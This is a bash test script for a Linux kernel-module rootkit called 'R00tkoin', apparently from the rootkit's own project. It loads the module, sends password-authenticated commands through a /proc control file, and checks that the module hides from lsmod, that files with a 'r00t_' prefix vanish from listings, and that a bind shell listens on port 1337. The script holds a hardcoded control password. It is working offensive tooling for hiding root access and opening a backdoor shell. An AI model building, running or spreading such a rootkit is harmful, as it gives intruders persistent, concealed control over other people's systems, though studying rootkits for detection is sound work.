#!/bin/bash

# R00tkoin v1.0 Test Script
# Advanced LKM Rootkit Testing Suite

echo "========================================"
echo "R00tkoin v1.0 - Test Suite"
echo "Advanced LKM Rootkit"
echo "========================================"

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

# Configuration
PASSWORD="r00tkoinFTW1337"
PROC_COMM="/proc/r00t_comm"
MODULE_NAME="r00tkoin"

# Function to send command
send_command() {
    local cmd="$1"
    echo -e "${BLUE}[CMD]${NC} $PASSWORD $cmd"
    echo "$PASSWORD $cmd" | sudo tee $PROC_COMM > /dev/null
    sleep 1
}

# Function to check module visibility
check_module() {
    if lsmod | grep -q $MODULE_NAME; then
        echo -e "${GREEN}[INFO]${NC} Module VISIBLE"
        return 0
    else
        echo -e "${YELLOW}[INFO]${NC} Module HIDDEN"
        return 1
    fi
}

# Function to test bind shell with timeout
test_bind_shell() {
    echo -e "${BLUE}[TEST]${NC} Testing bind shell connectivity..."
    
    # Test if port is listening
    sleep 2
    if ss -tlnp | grep -q ":1337 "; then
        echo -e "${GREEN}[SUCCESS]${NC} Bind shell is listening on port 1337"
        
        # Test connection with timeout
        timeout 3 bash -c "echo 'test' | nc -w 1 localhost 1337" > /dev/null 2>&1
        if [ $? -eq 124 ]; then
            echo -e "${GREEN}[SUCCESS]${NC} Bind shell accepting connections (timed out as expected)"
        else
            echo -e "${YELLOW}[INFO]${NC} Bind shell connection test completed"
        fi
    else
        echo -e "${RED}[ERROR]${NC} Bind shell not listening on port 1337"
    fi
}

echo -e "\n${BLUE}=== Loading Module ===${NC}"
if [ ! -f "output/r00tkoin.ko" ]; then
    echo -e "${RED}[ERROR]${NC} Module not found. Run 'make all' first."
    exit 1
fi

sudo insmod output/r00tkoin.ko
if [ $? -eq 0 ]; then
    echo -e "${GREEN}[SUCCESS]${NC} Module loaded"
else
    echo -e "${RED}[ERROR]${NC} Failed to load module"
    exit 1
fi

echo -e "\n${BLUE}=== Interface Check ===${NC}"
cat $PROC_COMM

echo -e "\n${BLUE}=== Module Hiding Test ===${NC}"
check_module
send_command "hide"
check_module
send_command "unhide"
check_module

echo -e "\n${BLUE}=== File Hiding Test ===${NC}"
touch r00t_secret.txt r00t_hidden.log normal_file.txt
ls -la r00t_* normal_file.txt
send_command "filehide"
echo -e "${BLUE}[INFO]${NC} File hiding enabled - files with 'r00t_' prefix should be hidden in directory listings"

echo -e "\n${BLUE}=== Bind Shell Test ===${NC}"
send_command "bindshell"
test_bind_shell

echo -e "\n${BLUE}=== Command Tests ===${NC}"
send_command "status"
send_command "help"
send_command "fileshow"
send_command "stopshell"

echo -e "\n${BLUE}=== Security Tests ===${NC}"
echo "wrongpassword test" | sudo tee $PROC_COMM > /dev/null 2>&1
if [ $? -ne 0 ]; then
    echo -e "${GREEN}[SUCCESS]${NC} Invalid password properly rejected"
else
    echo -e "${YELLOW}[INFO]${NC} Password validation behavior noted"
fi
send_command "invalidcmd"

echo -e "\n${BLUE}=== Status Check ===${NC}"
send_command "status"

echo -e "\n${BLUE}=== Kernel Logs ===${NC}"
dmesg | tail -10 | grep -i r00tkoin || echo "No recent r00tkoin messages in dmesg"

echo -e "\n${BLUE}=== Unloading ===${NC}"
sudo rmmod $MODULE_NAME
if [ $? -eq 0 ]; then
    echo -e "${GREEN}[SUCCESS]${NC} Module unloaded"
else
    echo -e "${RED}[ERROR]${NC} Failed to unload - trying cleanup"
    make clean > /dev/null 2>&1
fi

# Cleanup
rm -f r00t_secret.txt r00t_hidden.log normal_file.txt
echo -e "${GREEN}[SUCCESS]${NC} Cleanup complete"

echo -e "\n${GREEN}========================================"
echo "R00tkoin v1.0 Test Complete"
echo "========================================"
echo -e "Features Tested:${NC}"
echo "✓ Module loading/unloading"
echo "✓ Stealth communication"
echo "✓ Module hiding"
echo "✓ File hiding"
echo "✓ Bind shell"
echo "✓ Command processing"
echo "✓ Password protection"
echo "✓ Security validation" 